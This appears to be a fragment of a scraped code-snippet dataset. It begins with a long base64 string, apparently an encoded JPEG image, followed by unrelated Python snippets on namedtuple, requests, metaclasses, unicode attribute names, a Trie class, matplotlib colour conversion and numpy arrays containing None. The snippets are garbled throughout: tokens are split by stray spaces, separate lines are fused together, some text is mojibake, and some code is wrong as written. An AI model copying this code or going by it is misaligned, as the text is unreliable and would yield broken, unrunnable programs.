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 '' }"
"EmployeeRecord = namedtuple ( 'EmployeeRecord ' , 'name , age , title , department , paygrade ' ) Color = namedtuple ( 'Color ' , 'red green blue ' ) namedtuple ( 'Point ' , ' x y ' ) Point = namedtuple ( ' x y ' )"
text = requests.get ( `` http : //example.com '' ) # send GET requests to the websiteprint text.text # print the variable < div > < p > ×©×¨×ª < /p > < /div > < div > < p > שרת < /p > < /div >
"def metest ( cls , name , bases , dict ) : cls.setattr ( cls , '__doc__ ' , '' '' '' Default Doc '' '' '' ) return type ( cls , ( ) , { } ) __metaclass__=metestclass test ( object ) : passprint test.__doc__t=test ( ) print t.__doc__ NoneNone"
"> > > class Test : µ = 'foo ' > > > Test.µ'foo ' > > > getattr ( Test , ' µ ' ) Traceback ( most recent call last ) : File `` < pyshell # 4 > '' , line 1 , in < module > getattr ( Test , ' µ ' ) AttributeError : type object 'Test ' has no attribute ' µ ' > > > ' µ'.encode ( ) , dir ( Test ) [ -1 ] .encode ( ) ( b'\xc2\xb5 ' , b'\xce\xbc ' )"
class Trie : @ staticmethod def from_mapping ( mapping ) - > Trie : # docstrings and initialization ommitted trie = Trie ( ) return trie
import matplotlibimport matplotlib.pyplot as pltimport matplotlib.image as mpimg plt.imshow ( matplotlib.colors.hsv_to_rgb ( matplotlib.colors.rgb_to_hsv ( mpimg.imread ( 'go2.jpg ' ) ) ) )
"> > > import numpy as np > > > v=np.array ( [ 10.0 , 11.0 ] ) > > > print v - 1.0 [ 9 . 10 . ] > > > v=np.array ( [ 10.0 , 11.0 , None ] ) > > > print v - 1.0Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : unsupported operand type ( s ) for - : 'NoneType ' and 'float ' [ 9 . 10 . None ]"
